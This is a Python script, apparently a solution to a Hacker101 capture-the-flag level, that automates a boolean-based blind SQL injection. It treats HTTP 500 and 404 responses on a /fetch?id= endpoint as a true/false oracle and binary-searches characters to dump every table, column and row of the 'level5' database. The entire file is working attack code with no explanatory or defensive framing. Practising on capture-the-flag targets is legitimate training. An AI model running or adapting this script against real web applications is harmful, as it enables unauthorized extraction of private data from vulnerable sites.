#!/usr/bin/env python3
"""Full blind dump of level5 DB (v2, consistent encoding).
Oracle: /fetch?id=3 AND <cond> -> 500 TRUE / 404 FALSE.
"""
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "https://f69716e4ca42fa5db261fc835d4fddee.ctf.hacker101.com"
PROG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ctf_dump2_progress.json")
SLEEP = 0.2
TIMEOUT = 10


def load():
    if os.path.exists(PROG):
        try:
            with open(PROG) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save(d):
    with open(PROG, "w") as f:
        json.dump(d, f, indent=1)


def cond(sql):
    """URL-encode a SQL condition, keeping parens so the f-string math stays simple."""
    return urllib.parse.quote(sql, safe="()")


def http(frag):
    url = f"{BASE}/fetch?id=3+AND+{frag}"
    for a in range(4):
        try:
            with urllib.request.urlopen(url, timeout=TIMEOUT) as r:
                return r.getcode()
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            time.sleep(1.2)
    return 0


def T(cond_enc):
    c = http(cond_enc)
    return c == 500


def num(expr_sql, maxv=200, label=""):
    lo, hi = 0, maxv
    while lo < hi:
        time.sleep(SLEEP)
        mid = (lo + hi + 1) // 2
        if T(cond(f"{expr_sql}>={mid}")):
            lo = mid
        else:
            hi = mid - 1
    print(f"[num] {label} = {lo}", flush=True)
    return lo


def extract(expr_sql, maxlen=300, label="val", cache=None):
    if cache is None:
        cache = {}
    key = f"str_{label}"
    if cache.get(key, {}).get("done"):
        print(f"[cached] {label} = {cache[key]['value']!r}")
        return cache[key]["value"]
    val = cache.get(key, {}).get("value", "")
    start = len(val) + 1 if val else 1
    for i in range(start, maxlen + 1):
        if not T(cond(f"LENGTH({expr_sql})>={i}")):
            cache.setdefault(key, {})["value"] = val
            cache[key]["done"] = True
            save(cache)
            print(f"[done] {label} = {val!r}", flush=True)
            return val
        lo, hi = 32, 127
        while lo < hi:
            time.sleep(SLEEP)
            mid = (lo + hi) // 2
            if T(cond(f"ASCII(SUBSTRING({expr_sql},{i},1))>={mid}")):
                lo = mid + 1
            else:
                hi = mid
        ch = chr(lo - 1)
        val += ch
        cache.setdefault(key, {})["value"] = val
        cache[key]["done"] = False
        save(cache)
        print(f"  [{label}] {i}: {ch!r} -> {val!r}", flush=True)
    return val


def q_table_names(cache):
    cache.setdefault("tables", [])
    names = cache["tables"]
    guard = "zzz"
    while True:
        expr = (f"(SELECT MAX(table_name) FROM information_schema.tables "
                f"WHERE table_schema='level5' AND table_name<'{guard}')")
        name = extract(expr, 60, f"tbl_{len(names)}", cache)
        if not name:
            break
        names.append(name)
        cache["tables"] = names
        save(cache)
        guard = name
    print("[tables]", names)
    return names


def q_columns(table, cache):
    cache.setdefault(f"cols_{table}", [])
    cols = cache[f"cols_{table}"]
    guard = "zzz"
    while True:
        expr = (f"(SELECT MAX(column_name) FROM information_schema.columns "
                f"WHERE table_schema='level5' AND table_name='{table}' "
                f"AND column_name<'{guard}')")
        col = extract(expr, 80, f"col_{table}_{len(cols)}", cache)
        if not col:
            break
        cols.append(col)
        cache[f"cols_{table}"] = cols
        save(cache)
        guard = col
    print(f"[cols {table}]", cols)
    return cols


def q_cell(table, col, idx, cache):
    label = f"cell_{table}.{col}.{idx}"
    expr = f"(SELECT {col} FROM {table} LIMIT {idx},1)"
    return extract(expr, 300, label, cache)


def main():
    cache = load()
    tables = q_table_names(cache)
    for t in tables:
        cols = q_columns(t, cache)
        n = num(f"(SELECT count(*) FROM {t})", 100, f"rows_{t}")
        for i in range(n):
            for c in cols:
                q_cell(t, c, i, cache)
    print("[ALL DONE]", json.dumps(cache, indent=1))


if __name__ == "__main__":
    main()